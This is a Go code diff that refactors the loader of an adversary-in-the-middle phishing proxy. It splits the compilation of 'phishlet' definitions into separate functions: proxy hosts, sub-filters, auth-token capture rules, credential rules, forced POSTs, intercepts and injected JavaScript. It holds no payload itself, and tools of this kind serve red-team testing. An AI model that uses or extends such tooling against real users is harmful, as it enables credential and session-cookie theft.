@@ -93,7 +93,53 @@ func (l *Loader) parseFile(path string) (*rawPhishlet, error) {
 func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string) (*aitm.PhishletDef, error) {
 	var errs ParseErrors
 
-	// ── Identity validation ──────────────────────────────────────────────────
+	errs = append(errs, l.validateIdentity(path, raw)...)
+
+	proxyHosts, phErrs := l.compileProxyHosts(path, raw.ProxyHosts, params)
+	errs = append(errs, phErrs...)
+
+	subFilters, sfErrs := l.compileSubFilters(path, raw.SubFilters, params)
+	errs = append(errs, sfErrs...)
+
+	authTokens, atErrs := l.compileAuthTokens(path, raw.AuthTokens, params)
+	errs = append(errs, atErrs...)
+
+	credRules, credErrs := l.compileCredentials(path, raw.Credentials, params)
+	errs = append(errs, credErrs...)
+
+	forcePosts, fpErrs := l.compileForcePosts(path, raw.ForcePosts, params)
+	errs = append(errs, fpErrs...)
+
+	intercepts, intErrs := l.compileIntercepts(path, raw.Intercepts, params)
+	errs = append(errs, intErrs...)
+
+	jsInjects, jsErrs := l.compileJSInjects(path, raw.JSInjects, params)
+	errs = append(errs, jsErrs...)
+
+	if len(errs) > 0 {
+		return nil, errs
+	}
+
+	return &aitm.PhishletDef{
+		Name:        raw.Name,
+		Author:      raw.Author,
+		Version:     raw.Version,
+		ProxyHosts:  proxyHosts,
+		SubFilters:  subFilters,
+		AuthTokens:  authTokens,
+		Credentials: credRules,
+		Login: aitm.LoginSpec{
+			Domain: substitute(raw.Login.Domain, params),
+			Path:   substitute(raw.Login.Path, params),
+		},
+		ForcePosts: forcePosts,
+		Intercepts: intercepts,
+		JSInjects:  jsInjects,
+	}, nil
+}
+
+func (l *Loader) validateIdentity(path string, raw *rawPhishlet) ParseErrors {
+	var errs ParseErrors
 	if raw.Name == "" {
 		errs = append(errs, ParseError{File: path, Field: "name", Message: "required"})
 	}
@@ -103,17 +149,21 @@ func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string
 	if raw.Version == "" {
 		errs = append(errs, ParseError{File: path, Field: "version", Message: "required"})
 	}
+	return errs
+}
 
-	// ── proxy_hosts ──────────────────────────────────────────────────────────
-	if len(raw.ProxyHosts) == 0 {
+func (l *Loader) compileProxyHosts(path string, raw []rawProxyHost, params map[string]string) ([]aitm.ProxyHost, ParseErrors) {
+	var errs ParseErrors
+	if len(raw) == 0 {
 		errs = append(errs, ParseError{
 			File:    path,
 			Field:   "proxy_hosts",
 			Message: "at least one proxy_host is required",
 		})
+		return nil, errs
 	}
-	var proxyHosts []aitm.ProxyHost
-	for i, rawHost := range raw.ProxyHosts {
+	hosts := make([]aitm.ProxyHost, 0, len(raw))
+	for i, rawHost := range raw {
 		field := fmt.Sprintf("proxy_hosts[%d]", i)
 		if rawHost.PhishSub == "" {
 			errs = append(errs, ParseError{File: path, Field: field + ".phish_sub", Message: "required"})
@@ -128,7 +178,7 @@ func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string
 		if rawHost.AutoFilter != nil {
 			autoFilter = *rawHost.AutoFilter
 		}
-		proxyHosts = append(proxyHosts, aitm.ProxyHost{
+		hosts = append(hosts, aitm.ProxyHost{
 			PhishSubdomain: substitute(rawHost.PhishSub, params),
 			OrigSubdomain:  substitute(rawHost.OrigSub, params),
 			Domain:         substitute(rawHost.Domain, params),
@@ -137,26 +187,23 @@ func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string
 			AutoFilter:     autoFilter,
 		})
 	}
+	return hosts, errs
+}
 
-	// ── sub_filters ──────────────────────────────────────────────────────────
-	var subFilters []aitm.SubFilter
-	for i, rawFilter := range raw.SubFilters {
+func (l *Loader) compileSubFilters(path string, raw []rawSubFilter, params map[string]string) ([]aitm.SubFilter, ParseErrors) {
+	var errs ParseErrors
+	filters := make([]aitm.SubFilter, 0, len(raw))
+	for i, rawFilter := range raw {
 		field := fmt.Sprintf("sub_filters[%d]", i)
 		if rawFilter.Search == "" {
 			errs = append(errs, ParseError{File: path, Field: field + ".search", Message: "required"})
 			continue
 		}
-		searchPattern := substitute(rawFilter.Search, params)
-		searchRegex, compErr := regexp.Compile(searchPattern)
-		if compErr != nil {
-			errs = append(errs, ParseError{
-				File:    path,
-				Field:   field + ".search",
-				Message: fmt.Sprintf("invalid regex: %v", compErr),
-			})
+		searchRegex, err := mustCompile(substitute(rawFilter.Search, params), path, field+".search", &errs)
+		if err != nil {
 			continue
 		}
-		subFilters = append(subFilters, aitm.SubFilter{
+		filters = append(filters, aitm.SubFilter{
 			Hostname:   substitute(rawFilter.Hostname, params),
 			MimeTypes:  rawFilter.MimeTypes,
 			Search:     searchRegex,
@@ -164,17 +211,21 @@ func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string
 			WithParams: rawFilter.WithParams,
 		})
 	}
+	return filters, errs
+}
 
-	// ── auth_tokens ──────────────────────────────────────────────────────────
-	if len(raw.AuthTokens) == 0 {
+func (l *Loader) compileAuthTokens(path string, raw []rawAuthToken, params map[string]string) ([]aitm.TokenRule, ParseErrors) {
+	var errs ParseErrors
+	if len(raw) == 0 {
 		errs = append(errs, ParseError{
 			File:    path,
 			Field:   "auth_tokens",
 			Message: "at least one auth_token entry is required",
 		})
+		return nil, errs
 	}
-	var authTokens []aitm.TokenRule
-	for i, rawToken := range raw.AuthTokens {
+	var rules []aitm.TokenRule
+	for i, rawToken := range raw {
 		field := fmt.Sprintf("auth_tokens[%d]", i)
 		tokenType := aitm.TokenTypeCookie
 		switch strings.ToLower(rawToken.Type) {
@@ -200,28 +251,18 @@ func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string
 				errs = append(errs, ParseError{File: path, Field: kField + ".name", Message: "required"})
 				continue
 			}
-			nameRe, compErr := regexp.Compile(key.Name)
-			if compErr != nil {
-				errs = append(errs, ParseError{
-					File:    path,
-					Field:   kField + ".name",
-					Message: fmt.Sprintf("invalid regex: %v", compErr),
-				})
+			nameRe, err := mustCompile(key.Name, path, kField+".name", &errs)
+			if err != nil {
 				continue
 			}
 			var searchRe *regexp.Regexp
 			if key.Search != "" {
-				searchRe, compErr = regexp.Compile(key.Search)
-				if compErr != nil {
-					errs = append(errs, ParseError{
-						File:    path,
-						Field:   kField + ".search",
-						Message: fmt.Sprintf("invalid regex: %v", compErr),
-					})
+				searchRe, err = mustCompile(key.Search, path, kField+".search", &errs)
+				if err != nil {
 					continue
 				}
 			}
-			authTokens = append(authTokens, aitm.TokenRule{
+			rules = append(rules, aitm.TokenRule{
 				Type:     tokenType,
 				Domain:   substitute(rawToken.Domain, params),
 				Name:     nameRe,
@@ -231,141 +272,7 @@ func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string
 			})
 		}
 	}
-
-	// ── credentials ──────────────────────────────────────────────────────────
-	credRules, credErrs := l.compileCredentials(path, raw.Credentials, params)
-	errs = append(errs, credErrs...)
-
-	// ── force_post ───────────────────────────────────────────────────────────
-	var forcePosts []aitm.ForcePost
-	for i, rawPost := range raw.ForcePosts {
-		field := fmt.Sprintf("force_post[%d]", i)
-		if rawPost.Path == "" {
-			errs = append(errs, ParseError{File: path, Field: field + ".path", Message: "required"})
-			continue
-		}
-		pathRe, compErr := regexp.Compile(substitute(rawPost.Path, params))
-		if compErr != nil {
-			errs = append(errs, ParseError{
-				File:    path,
-				Field:   field + ".path",
-				Message: fmt.Sprintf("invalid regex: %v", compErr),
-			})
-			continue
-		}
-		var conds []aitm.ForcePostCondition
-		for j, condition := range rawPost.Conditions {
-			cField := fmt.Sprintf("%s.conditions[%d]", field, j)
-			keyRe, err := mustCompile(condition.Key, path, cField+".key", &errs)
-			if err != nil {
-				continue
-			}
-			searchRe, err := mustCompile(condition.Search, path, cField+".search", &errs)
-			if err != nil {
-				continue
-			}
-			conds = append(conds, aitm.ForcePostCondition{Key: keyRe, Search: searchRe})
-		}
-		var fparams []aitm.ForcePostParam
-		for _, param := range rawPost.Params {
-			fparams = append(fparams, aitm.ForcePostParam{
-				Key:   substitute(param.Key, params),
-				Value: substitute(param.Value, params),
-			})
-		}
-		forcePosts = append(forcePosts, aitm.ForcePost{
-			Path:       pathRe,
-			Conditions: conds,
-			Params:     fparams,
-		})
-	}
-
-	// ── intercept ────────────────────────────────────────────────────────────
-	var intercepts []aitm.InterceptRule
-	for i, rawIntercept := range raw.Intercepts {
-		field := fmt.Sprintf("intercept[%d]", i)
-		if rawIntercept.Path == "" {
-			errs = append(errs, ParseError{File: path, Field: field + ".path", Message: "required"})
-			continue
-		}
-		pathRe, compErr := regexp.Compile(substitute(rawIntercept.Path, params))
-		if compErr != nil {
-			errs = append(errs, ParseError{
-				File:    path,
-				Field:   field + ".path",
-				Message: fmt.Sprintf("invalid regex: %v", compErr),
-			})
-			continue
-		}
-		var bodyRe *regexp.Regexp
-		if rawIntercept.BodySearch != "" {
-			bodyRe, compErr = regexp.Compile(substitute(rawIntercept.BodySearch, params))
-			if compErr != nil {
-				errs = append(errs, ParseError{
-					File:    path,
-					Field:   field + ".body_search",
-					Message: fmt.Sprintf("invalid regex: %v", compErr),
-				})
-				continue
-			}
-		}
-		if rawIntercept.Status == 0 {
-			errs = append(errs, ParseError{File: path, Field: field + ".status", Message: "required"})
-		}
-		intercepts = append(intercepts, aitm.InterceptRule{
-			Path:        pathRe,
-			BodySearch:  bodyRe,
-			StatusCode:  rawIntercept.Status,
-			ContentType: substitute(rawIntercept.ContentType, params),
-			Body:        substitute(rawIntercept.Body, params),
-		})
-	}
-
-	// ── js_inject ────────────────────────────────────────────────────────────
-	var jsInjects []aitm.JSInject
-	for i, rawJSInject := range raw.JSInjects {
-		field := fmt.Sprintf("js_inject[%d]", i)
-		var triggerPathRe *regexp.Regexp
-		if rawJSInject.TriggerPath != "" {
-			var compErr error
-			triggerPathRe, compErr = regexp.Compile(substitute(rawJSInject.TriggerPath, params))
-			if compErr != nil {
-				errs = append(errs, ParseError{
-					File:    path,
-					Field:   field + ".trigger_path",
-					Message: fmt.Sprintf("invalid regex: %v", compErr),
-				})
-				continue
-			}
-		}
-		jsInjects = append(jsInjects, aitm.JSInject{
-			TriggerDomain: substitute(rawJSInject.TriggerDomain, params),
-			TriggerPath:   triggerPathRe,
-			Script:        substitute(rawJSInject.Script, params),
-		})
-	}
-
-	// ── Return early if any errors were found ────────────────────────────────
-	if len(errs) > 0 {
-		return nil, errs
-	}
-
-	return &aitm.PhishletDef{
-		Name:        raw.Name,
-		Author:      raw.Author,
-		Version:     raw.Version,
-		ProxyHosts:  proxyHosts,
-		SubFilters:  subFilters,
-		AuthTokens:  authTokens,
-		Credentials: credRules,
-		Login: aitm.LoginSpec{
-			Domain: substitute(raw.Login.Domain, params),
-			Path:   substitute(raw.Login.Path, params),
-		},
-		ForcePosts: forcePosts,
-		Intercepts: intercepts,
-		JSInjects:  jsInjects,
-	}, nil
+	return rules, errs
 }
 
 // compileCredentials validates and compiles the credentials section.
@@ -422,6 +329,104 @@ func (l *Loader) compileCredentials(path string, raw rawCredentials, params map[
 	}
 
 	return rules, errs
+}
+
+func (l *Loader) compileForcePosts(path string, raw []rawForcePost, params map[string]string) ([]aitm.ForcePost, ParseErrors) {
+	var errs ParseErrors
+	posts := make([]aitm.ForcePost, 0, len(raw))
+	for i, rawPost := range raw {
+		field := fmt.Sprintf("force_post[%d]", i)
+		if rawPost.Path == "" {
+			errs = append(errs, ParseError{File: path, Field: field + ".path", Message: "required"})
+			continue
+		}
+		pathRe, err := mustCompile(substitute(rawPost.Path, params), path, field+".path", &errs)
+		if err != nil {
+			continue
+		}
+		var conds []aitm.ForcePostCondition
+		for j, condition := range rawPost.Conditions {
+			cField := fmt.Sprintf("%s.conditions[%d]", field, j)
+			keyRe, err := mustCompile(condition.Key, path, cField+".key", &errs)
+			if err != nil {
+				continue
+			}
+			searchRe, err := mustCompile(condition.Search, path, cField+".search", &errs)
+			if err != nil {
+				continue
+			}
+			conds = append(conds, aitm.ForcePostCondition{Key: keyRe, Search: searchRe})
+		}
+		var fparams []aitm.ForcePostParam
+		for _, param := range rawPost.Params {
+			fparams = append(fparams, aitm.ForcePostParam{
+				Key:   substitute(param.Key, params),
+				Value: substitute(param.Value, params),
+			})
+		}
+		posts = append(posts, aitm.ForcePost{
+			Path:       pathRe,
+			Conditions: conds,
+			Params:     fparams,
+		})
+	}
+	return posts, errs
+}
+
+func (l *Loader) compileIntercepts(path string, raw []rawIntercept, params map[string]string) ([]aitm.InterceptRule, ParseErrors) {
+	var errs ParseErrors
+	intercepts := make([]aitm.InterceptRule, 0, len(raw))
+	for i, rawIntercept := range raw {
+		field := fmt.Sprintf("intercept[%d]", i)
+		if rawIntercept.Path == "" {
+			errs = append(errs, ParseError{File: path, Field: field + ".path", Message: "required"})
+			continue
+		}
+		pathRe, err := mustCompile(substitute(rawIntercept.Path, params), path, field+".path", &errs)
+		if err != nil {
+			continue
+		}
+		var bodyRe *regexp.Regexp
+		if rawIntercept.BodySearch != "" {
+			bodyRe, err = mustCompile(substitute(rawIntercept.BodySearch, params), path, field+".body_search", &errs)
+			if err != nil {
+				continue
+			}
+		}
+		if rawIntercept.Status == 0 {
+			errs = append(errs, ParseError{File: path, Field: field + ".status", Message: "required"})
+		}
+		intercepts = append(intercepts, aitm.InterceptRule{
+			Path:        pathRe,
+			BodySearch:  bodyRe,
+			StatusCode:  rawIntercept.Status,
+			ContentType: substitute(rawIntercept.ContentType, params),
+			Body:        substitute(rawIntercept.Body, params),
+		})
+	}
+	return intercepts, errs
+}
+
+func (l *Loader) compileJSInjects(path string, raw []rawJSInject, params map[string]string) ([]aitm.JSInject, ParseErrors) {
+	var errs ParseErrors
+	injects := make([]aitm.JSInject, 0, len(raw))
+	for i, rawJSInject := range raw {
+		field := fmt.Sprintf("js_inject[%d]", i)
+		var triggerPathRe *regexp.Regexp
+		if rawJSInject.TriggerPath != "" {
+			var err error
+			triggerPathRe, err = mustCompile(substitute(rawJSInject.TriggerPath, params), path, field+".trigger_path", &errs)
+			if err != nil {
+				continue
+			}
+		}
+		injects = append(injects, aitm.JSInject{
+			TriggerDomain: substitute(rawJSInject.TriggerDomain, params),
+			TriggerPath:   triggerPathRe,
+			Script:        substitute(rawJSInject.Script, params),
+		})
+	}
+	return injects, errs
 }
 
 // substitute replaces all {key} placeholders in s with the corresponding value
